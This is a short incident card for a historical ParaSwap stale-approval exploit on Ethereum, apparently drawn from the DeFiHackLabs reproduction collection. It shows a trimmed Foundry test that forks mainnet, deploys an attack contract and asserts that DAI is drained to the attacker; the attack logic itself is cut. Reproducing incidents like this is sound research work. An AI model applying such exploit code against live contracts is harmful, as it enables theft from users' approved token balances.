# [?] ParaSwapDAIApproval - Stale Approval

## Summary
Severity: Unknown
Chain: Ethereum
Component: ParaSwapDAIApproval
Published: 2025-06-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/ParaSwapDAIApproval_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2,298.68 USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_778_354);
        vm.roll(22_778_355);
        vm.warp(HISTORICAL_DEADLINE);

        fundingToken = DAI_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_FLASH_HELPER, "Historical flash helper");
        vm.label(ALERT_VICTIM, "Alert victim");
        vm.label(DAI_SOURCE_ACCOUNT, "DAI source account");
        vm.label(BALANCER_VAULT, "Balancer vault");
        vm.label(PARASWAP_AUGUSTUS, "ParaSwap Augustus");
        vm.label(TOKEN_TRANSFER_PROXY, "ParaSwap token transfer proxy");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(DAI_TOKEN, "DAI");
    }

    function testExploit() public balanceLog {
        uint256 attackerDaiBefore = IERC20(DAI_TOKEN).balanceOf(ATTACKER);
        uint256 sourceDaiBefore = IERC20(DAI_TOKEN).balanceOf(DAI_SOURCE_ACCOUNT);
        uint256 balancerWethBefore = IERC20(WETH_TOKEN).balanceOf(BALANCER_VAULT);

        assertGe(sourceDaiBefore, DAI_DRAIN_AMOUNT);

        ParaSwapDAIApprovalAttack attack = new ParaSwapDAIApprovalAttack(ATTACKER);
        attack.execute();

        assertEq(IERC20(WETH_TOKEN).balanceOf(BALANCER_VAULT), balancerWethBefore);
        assertEq(sourceDaiBefore - IERC20(DAI_TOKEN).balanceOf(DAI_SOURCE_ACCOUNT), DAI_DRAIN_AMOUNT);
        assertEq(IERC20(DAI_TOKEN).balanceOf(ATTACKER) - attackerDaiBefore, DAI_DRAIN_AMOUNT);
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/ParaSwapDAIApproval_exp.sol_
